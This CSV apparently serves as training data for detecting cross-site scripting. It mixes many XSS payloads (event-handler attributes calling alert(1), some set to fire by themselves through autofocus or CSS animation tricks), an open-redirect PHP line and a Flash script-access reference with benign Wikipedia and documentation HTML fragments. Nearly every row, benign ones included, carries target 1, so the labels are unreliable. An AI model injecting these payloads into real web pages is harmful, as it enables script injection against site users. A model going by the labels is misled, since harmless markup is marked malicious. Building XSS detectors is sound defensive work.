text,target
"<li id=""cite_note-Robotic_mapping-131""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Robotic_mapping_131-0"">^ </a> </b>",1
"<object onmousedown=""alert(1)"">test</object>",1
"<area onbeforepaste=""alert(1)"" contenteditable>test</area>",1
</li>,1
"<ul><li><a href=""#CITEREFKurzweil1999"">Kurzweil 1999 </a> and <a href=""#CITEREFKurzweil2005"">Kurzweil 2005 </a> </li> </ul>",1
<template onpointerout=alert(1)>XSS</template>,1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",1
<s onpointerup=alert(1)>XSS</s>,1
"<select draggable=""true"" ondrag=""alert(1)"">test</select>",1
"<a onmouseup=""alert(1)"">test</a>",1
"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Related techniques </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",1
"<li id=""cite_note-59""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-59"">^ </a> </b>",1
"<style>:target {color: red;}</style><pre id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></pre>",1
"<li><a href=""/wiki/Photo_manipulation"" title=""Photo manipulation"">Image manipulation </a> </li>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></a>",1
<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>,1
"<time onclick=""alert(1)"">test</time>",1
</span>,1
"<canvas onbeforepaste=""alert(1)"" contenteditable>test</canvas>",1
<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>,1
"<li><a href=""/wiki/Centre_for_the_Study_of_Existential_Risk"" title=""Centre for the Study of Existential Risk"">Centre for the Study of Existential Risk </a> </li>",1
"<li><cite id=""CITEREFLenatGuha1989"" class=""citation book""><a href=""/wiki/Douglas_Lenat"" title=""Douglas Lenat"">Lenat, Douglas </a>; Guha, R. V. (1989). <i>Building Large Knowledge-Based Systems </i>. Addison-Wesley. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-201-51752-1"" title=""Special:BookSources/978-0-201-51752-1""><bdi>978-0-201-51752-1 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Building+Large+Knowledge-Based+Systems&amp;rft.pub=Addison-Wesley&amp;rft.date=1989&amp;rft.isbn=978-0-201-51752-1&amp;rft.aulast=Lenat&amp;rft.aufirst=Douglas&amp;rft.au=Guha%2C+R.+V.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",1
"<li id=""cite_note-Brain_simulation-153""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Brain_simulation_153-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Brain_simulation_153-1""><sup><i><b>b </b> </i> </sup> </a>",1
"<ul><li><cite class=""citation book""><a href=""/wiki/David_Berlinski"" title=""David Berlinski"">Berlinski, David </a> (2000). <a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/adventofalgorith0000berl""><i>The Advent of the Algorithm </i> </a>. Harcourt Books. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-15-601391-8"" title=""Special:BookSources/978-0-15-601391-8""><bdi>978-0-15-601391-8 </bdi> </a>. <a href=""/wiki/OCLC"" title=""OCLC"">OCLC </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//www.worldcat.org/oclc/46890682"">46890682 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=The+Advent+of+the+Algorithm&amp;rft.pub=Harcourt+Books&amp;rft.date=2000&amp;rft_id=info%3Aoclcnum%2F46890682&amp;rft.isbn=978-0-15-601391-8&amp;rft.aulast=Berlinski&amp;rft.aufirst=David&amp;rft_d=https%3A%2F%2Farchive.org%2Fdetails%2Fadventofalgorith0000berl&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",1
"<center onclick=""alert(1)"">test</center>",1
"<h1 draggable=""true"" ondragleave=""alert(1)"">test</h1>",1
"<div onkeyup=""alert(1)"" contenteditable>test</div>",1
<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>,1
"<dl draggable=""true"" ondrag=""alert(1)"">test</dl>",1
<div onpointerout=alert(1)>XSS</div>,1
</span> </h4>,1
"<style>:target {color:red;}</style><slot id=x style=""transition:color 1s"" ontransitionend=alert(1)></slot>",1
"<applet onmouseover=""alert(1)"">test</applet>",1
"<figure onbeforecut=""alert(1)"" contenteditable>test</figure>",1
"<canvas onmousemove=""alert(1)"">test</canvas>",1
"<h1 onpaste=""alert(1)"" contenteditable>test</h1>",1
"<li id=""cite_note-ivak1971-253""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-ivak1971_253-0"">^ </a> </b>",1
<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>,1
</div>,1
"<li id=""cite_note-FOOTNOTERussellNorvig200918.12:_Learning_from_Examples:_Summary-231""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTERussellNorvig200918.12:_Learning_from_Examples:_Summary_231-0"">^ </a> </b>",1
<textarea onpointermove=alert(1)>XSS</textarea>,1
</body>,1
document.write,1
<area onpointerenter=alert(1)>XSS</area>,1
"<marquee onbeforecut=""alert(1)"" contenteditable>test</marquee>",1
"<audio oncontextmenu=""alert(1)"">test</audio>",1
<isindex onpointerup=alert(1)>XSS</isindex>,1
"<ul><li><a rel=""nofollow"" class=""external text"" href=""http://www.ieee-cis.org/"">IEEE Computational Intelligence Society </a> <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20080509191840/http://www.ieee-cis.org/"">Archived </a> 9 May 2008 at the <a href=""/wiki/Wayback_Machine"" title=""Wayback Machine"">Wayback Machine </a> </li> </ul>",1
"<li id=""cite_note-330""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-330"">^ </a> </b>",1
"<strike onmouseup=""alert(1)"">test</strike>",1
"<div id=""John_McCarthy"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/John_McCarthy_(computer_scientist)"" title=""John McCarthy (computer scientist)"">John McCarthy </a> </div> </th> </tr><tr><td colspan=""2"" class=""navbox-list navbox-odd"" style=""width:100%;padding:0px"">",1
<kbd id=x tabindex=1 onfocus=alert(1)></kbd>,1
"<table onbeforepaste=""alert(1)"" contenteditable>test</table>",1
"<hr draggable=""true"" ondragleave=""alert(1)"">test</hr>",1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",1
"<summary onpaste=""alert(1)"" contenteditable>test</summary>",1
<bdo id=x tabindex=1 onactivate=alert(1)></bdo>,1
"<video onmouseout=""alert(1)"">test</video>",1
"<nav onclick=""alert(1)"">test</nav>",1
</span>,1
"<div style=""padding:0em 0.25em"">",1
"<noembed onkeyup=""alert(1)"" contenteditable>test</noembed>",1
"<area draggable=""true"" ondragstart=""alert(1)"">test</area>",1
"<li class=""toclevel-3 tocsection-55""><a href=""#Autonomous_weapons""><span class=""tocnumber"">8.2.5",1
<video onpointermove=alert(1)>XSS</video>,1
<input onchange=alert(1) value=xss>,1
"<center draggable=""true"" ondrag=""alert(1)"">test</center>",1
<dd id=x tabindex=1 onbeforeactivate=alert(1)></dd>,1
<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>,1
"<li><a href=""/wiki/Christof_Koch"" title=""Christof Koch"">Koch, Christof </a>, ""Proust among the Machines"", <i><a href=""/wiki/Scientific_American"" title=""Scientific American"">Scientific American </a> </i>, vol. 321, no. 6 (December 2019), pp.&#160;46–49. <a href=""/wiki/Christof_Koch"" title=""Christof Koch"">Christof Koch </a> doubts the possibility of ""intelligent"" machines attaining <a href=""/wiki/Consciousness"" title=""Consciousness"">consciousness </a>, because ""[e]ven the most sophisticated <a href=""/wiki/Brain_simulation"" title=""Brain simulation"">brain simulations </a> are unlikely to produce conscious <a href=""/wiki/Feelings"" class=""mw-redirect"" title=""Feelings"">feelings </a>."" (p.&#160;48.) According to Koch, ""Whether machines can become <a href=""/wiki/Sentience"" title=""Sentience"">sentient </a> [is important] for <a href=""/wiki/Ethics"" title=""Ethics"">ethical </a> reasons. If computers experience life through their own senses, they cease to be purely a means to an end determined by their usefulness to... humans. Per GNW [the <a href=""/wiki/Global_Workspace_Theory#Global_neuronal_workspace"" class=""mw-redirect"" title=""Global Workspace Theory"">Global Neuronal Workspace </a> theory], they turn from mere objects into subjects... with a <a href=""/wiki/Point_of_view_(philosophy)"" title=""Point of view (philosophy)"">point of view </a>.... Once computers' <a href=""/wiki/Cognitive_abilities"" class=""mw-redirect"" title=""Cognitive abilities"">cognitive abilities </a> rival those of humanity, their impulse to push for legal and political <a href=""/wiki/Rights"" title=""Rights"">rights </a> will become irresistible – the right not to be deleted, not to have their memories wiped clean, not to suffer <a href=""/wiki/Pain"" title=""Pain"">pain </a> and degradation. The alternative, embodied by IIT [Integrated Information Theory], is that computers will remain only supersophisticated machinery, ghostlike empty shells, devoid of what we value most: the feeling of life itself."" (p.&#160;49.) </li>",1
"<keygen onclick=""alert(1)"">test</keygen>",1
"<meter oncut=""alert(1)"" contenteditable>test</meter>",1
"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationstart=""alert(1)""></body>",1
"</span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.bbc.com/news/technology-35785875"">""Artificial intelligence: Google's AlphaGo beats Go master Lee Se-dol"" </a>. <i>BBC News </i>. 12 March 2016. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160826103910/http://www.bbc.com/news/technology-35785875"">Archived </a> from the original on 26 August 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">1 October ",1
<strike onpointerover=alert(1)>XSS</strike>,1
</span> ,1
"<style>:target {color:red;}</style><picture id=x style=""transition:color 1s"" ontransitionend=alert(1)></picture>",1
"<main onmousedown=""alert(1)"">test</main>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figcaption>",1
</head>,1
"<command oncontextmenu=""alert(1)"">test</command>",1
"<style>@keyframes x{}</style><title style=""animation-name:x"" onanimationstart=""alert(1)""></title>",1
"<link onkeydown=""alert(1)"" contenteditable>test</link>",1
"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;430–435 </li>",1
<command onpointerover=alert(1)>XSS</command>,1
"</span> <span class=""reference-text""><cite class=""citation journal"">Samuel, A. L. (July 1959). ""Some Studies in Machine Learning Using the Game of Checkers"". <i>IBM Journal of Research and Development </i>. <b>3 </b> (3): 210–229. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.368.2254"">10.1.1.368.2254 </a> ",1
<input id=x tabindex=1 onactivate=alert(1)></input>,1
"<tr onpaste=""alert(1)"" contenteditable>test</tr>",1
</li>,1
"<samp onmousemove=""alert(1)"">test</samp>",1
"<script onmousemove=""alert(1)"">test</script>",1
"<td onmouseenter=""alert(1)"">test</td>",1
"<style>@keyframes slidein {}</style><ins style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ins>",1
"<form draggable=""true"" ondragend=""alert(1)"">test</form>",1
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Wired+UK&amp;rft.atitle=The+UK+is+about+to+Start+Testing+Self-Driving+Truck+Platoons&amp;rft.date=2017-08-24&amp;rft.aulast=Burgess&amp;rft.aufirst=Matt&amp;rft_id=https%3A%2F%2Fwww.wired.co.uk%2Farticle%2Fuk-trial-self-driving-trucks-platoons-roads&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",1
"<div role=""navigation"" class=""navbox"" aria-labelledby=""Subfields_of_and_cyberneticians_involved_in_cybernetics"" style=""padding:3px""><table class=""nowraplinks mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",1
"<iframe onmouseenter=""alert(1)"">test</iframe>",1
"<listing onkeydown=""alert(1)"" contenteditable>test</listing>",1
<svg><ol onload=alert(1)></ol>,1
</li>,1
"<base onmouseover=""alert(1)"">test</base>",1
</span>,1
"<style>@keyframes x{}</style><plaintext style=""animation-name:x"" onanimationend=""alert(1)""></plaintext>",1
"<dt><a class=""reference internal"" href=""topics/deploy.html""><span class=""doc"">Deploying Spiders",1
</span>,1
"<keygen onmouseleave=""alert(1)"">test</keygen>",1
"<dd>The brain can be simulated by machines and because brains are intelligent, simulated brains must also be intelligent; thus machines can be intelligent. <a href=""/wiki/Hans_Moravec"" title=""Hans Moravec"">Hans Moravec </a>, <a href=""/wiki/Ray_Kurzweil"" title=""Ray Kurzweil"">Ray Kurzweil </a> and others have argued that it is technologically feasible to copy the brain directly into hardware and software and that such a simulation will be essentially identical to the original.<sup id=""cite_ref-Brain_simulation_153-1"" class=""reference""><a href=""#cite_note-Brain_simulation-153"">&#91;150&#93; </a> </sup> </dd> </dl>",1
</li>,1
<hr id=x tabindex=1 onactivate=alert(1)></hr>,1
</span> </h3>,1
"<style>:target {color:red;}</style><embed id=x style=""transition:color 1s"" ontransitionend=alert(1)></embed>",1
<bdo onpointerdown=alert(1)>XSS</bdo>,1
"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Software_development"" title=""Software development"">Software development </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",1
"<blockquote onbeforepaste=""alert(1)"" contenteditable>test</blockquote>",1
"</span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",1
<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>,1
"<fieldset oncopy=""alert(1)"" contenteditable>test</fieldset>",1
<basefont onpointerup=alert(1)>XSS</basefont>,1
"<li id=""cite_note-378""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-378"">^ </a> </b>",1
"<li>Try the <a class=""reference internal"" href=""faq.html""><span class=""doc"">FAQ",1
"<form ondblclick=""alert(1)"">test</form>",1
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;45–50 </li>",1
"</span> <span class=""toctext"">Perception ",1
"<li id=""cite_note-Decision_tree-217""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Decision_tree_217-0"">^ </a> </b>",1
</li>,1
<image srcset=1 onerror=alert(1)>,1
<address id=x tabindex=1 onactivate=alert(1)></address>,1
<tr onpointerup=alert(1)>XSS</tr>,1
"</span> <span class=""reference-text""><cite class=""citation journal"">Smoliar, Stephen W.; Zhang, HongJiang (1994). ""Content based video indexing and retrieval"". <i>IEEE Multimedia </i>. <b>1 </b> (2): 62–72. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1109%2F93.311653"">10.1109/93.311653 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=IEEE+Multimedia&amp;rft.atitle=Content+based+video+indexing+and+retrieval&amp;rft.volume=1&amp;rft.issue=2&amp;rft.pages=62-72&amp;rft.date=1994&amp;rft_id=info%3Adoi%2F10.1109%2F93.311653&amp;rft.aulast=Smoliar&amp;rft.aufirst=Stephen+W.&amp;rft.au=Zhang%2C+HongJiang&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",1
<header id=x tabindex=1 onfocus=alert(1)></header>,1
"<li><a href=""/wiki/Computational_geometry"" title=""Computational geometry"">Computational geometry </a> </li> </ul>",1
"<track onmouseleave=""alert(1)"">test</track>",1
</span> </li>,1
"<li><a href=""/wiki/Rudolf_Steiner"" title=""Rudolf Steiner"">Rudolf Steiner </a> </li>",1
</li>,1
"SRC=""http://ha.ckers.org/.swf"" AllowScriptAccess=""always""",1
"<content onmouseleave=""alert(1)"">test</content>",1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",1
"<fieldset onmouseover=""alert(1)"">test</fieldset>",1
<tfoot onpointerup=alert(1)>XSS</tfoot>,1
"<figcaption oncut=""alert(1)"" contenteditable>test</figcaption>",1
"<span draggable=""true"" ondragend=""alert(1)"">test</span>",1
latest,1
"<applet oncut=""alert(1)"" contenteditable>test</applet>",1
"<a href=""/wiki/File:Kismet_robot_at_MIT_Museum.jpg"" class=""image"">",1
"</span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft_id=https%3A%2F%2Fars.electronica.art%2Foutofthebox%2Fen%2Fdigital-humanism-conf%2F+Retrieved+September+2019&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><q id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></q>",1
</span>,1
"d=""alert('');\"")"";",1
"<li onmouseup=""alert(1)"">test</li>",1
<dd>,1
"<button onmousedown=""alert(1)"">test</button>",1
</span>,1
</li>,1
"<span class=""mw-editsection-bracket"">] ",1
"<li id=""cite_note-393""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-393"">^ </a> </b>",1
"<var onbeforecopy=""alert(1)"" contenteditable>test</var>",1
<article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>,1
"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Applied<br />computing </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",1
</dl>,1
</li>,1
"<form action=""/w/index.php"" id=""searchform"">",1
"<link rel=""search"" title=""Search"" href=""search.html"" />",1
"<li><a href=""/wiki/Gaussian_adaptation"" title=""Gaussian adaptation"">Gaussian adaptation </a> </li>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frameset id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></frameset>",1
<param id=x tabindex=1 ondeactivate=alert(1)></param><input id=y autofocus>,1
<th id=x tabindex=1 onbeforeactivate=alert(1)></th>,1
<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>,1
"<mark draggable=""true"" ondragleave=""alert(1)"">test</mark>",1
"<em onbeforepaste=""alert(1)"" contenteditable>test</em>",1
"<menu onkeyup=""alert(1)"" contenteditable>test</menu>",1
"</span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=42"" title=""Edit section: Video games"">edit </a><span class=""mw-editsection-bracket"">] ",1
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/extensions.html"">Extensions</a></li>",1
"<wbr oncut=""alert(1)"" contenteditable>test</wbr>",1
<style id=x tabindex=1 onactivate=alert(1)></style>,1
"<style>:target {color: red;}</style><u id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></u>",1
"<section onmouseover=""alert(1)"">test</section>",1
"<li><a href=""/wiki/Propositional_attitude"" title=""Propositional attitude"">Propositional attitude </a> </li>",1
"<title onmouseout=""alert(1)"">test</title>",1
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;863–898 </li>",1
<tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>,1
<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>,1
"<acronym onmousemove=""alert(1)"">test</acronym>",1
<input onpointermove=alert(1)>XSS</input>,1
header('Location: '.$_GET['param']);,1
</span> </h3>,1
"<slot oncontextmenu=""alert(1)"">test</slot>",1
"<li id=""cite_note-150""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-150"">^ </a> </b>",1
</span> 2015 ,1
"<video draggable=""true"" ondragleave=""alert(1)"">test</video>",1
<div onpointerleave=alert(1)>XSS</div>,1
"<li><a href=""/wiki/Information_theory"" title=""Information theory"">Information theory </a> </li>",1
"<img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/220px-Kismet_robot_at_MIT_Museum.jpg"" decoding=""async"" width=""220"" height=""165"" class=""thumbimage"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/330px-Kismet_robot_at_MIT_Museum.jpg 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/440px-Kismet_robot_at_MIT_Museum.jpg 2x"" data-file-width=""2272"" data-file-height=""1704"" /> </a>  ",1
<svg><spacer onload=alert(1)></spacer>,1
"<li><a href=""/wiki/Electronic_design_automation"" title=""Electronic design automation"">Electronic design automation </a> </li>",0
"<nav oncopy=""alert(1)"" contenteditable>test</nav>",1
"<ul><li><img alt=""Category"" src=""//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/16px-Folder_Hexagonal_Icon.svg.png"" decoding=""async"" title=""Category"" width=""16"" height=""14"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/24px-Folder_Hexagonal_Icon.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/32px-Folder_Hexagonal_Icon.svg.png 2x"" data-file-width=""36"" data-file-height=""31"" /> <b><a href=""/wiki/Category:Emerging_technologies"" title=""Category:Emerging technologies"">Category </a> </b> </li>",1
</span></a></dt><dd>Test your extraction code in an interactive environment.</dd>,1
<applet onreadystatechange=alert(1)></applet>,1
"<h3><span id=""Machine_consciousness.2C_sentience_and_mind"">",1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",1
"<strike onbeforecut=""alert(1)"" contenteditable>test</strike>",1
"<style>:target {transform: rotate(180deg);}</style><address id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></address>",1
"<li><a href=""/wiki/Multimedia_database"" title=""Multimedia database"">Multimedia information system </a> </li>",1
<body onpointerover=alert(1)>XSS</body>,1
<track id=x tabindex=1 onfocusin=alert(1)></track>,1
"<div onmouseleave=""alert(1)"">test</div>",1
"<li id=""cite_note-guardian_jobs_debate-24""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-guardian_jobs_debate_24-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-guardian_jobs_debate_24-1""><sup><i><b>b </b> </i> </sup> </a>",1
"</span> <span class=""toctext"">Motion and manipulation ",1
"<li onmousedown=""alert(1)"">test</li>",1
